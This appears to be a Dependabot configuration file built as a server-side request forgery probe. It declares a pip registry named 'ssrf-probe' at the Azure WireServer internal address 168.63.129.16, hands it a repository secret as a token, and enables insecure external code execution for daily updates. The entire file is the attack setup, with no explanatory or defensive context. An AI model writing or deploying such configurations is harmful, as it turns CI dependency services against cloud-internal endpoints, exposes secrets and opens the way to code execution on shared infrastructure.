version: 2
registries:
  ssrf-probe:
    type: python-index
    url: http://168.63.129.16/?comp=versions#
    token: ${{ secrets.SSRF_TOKEN }}
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "daily"
    insecure-external-code-execution: allow
    registries:
      - ssrf-probe
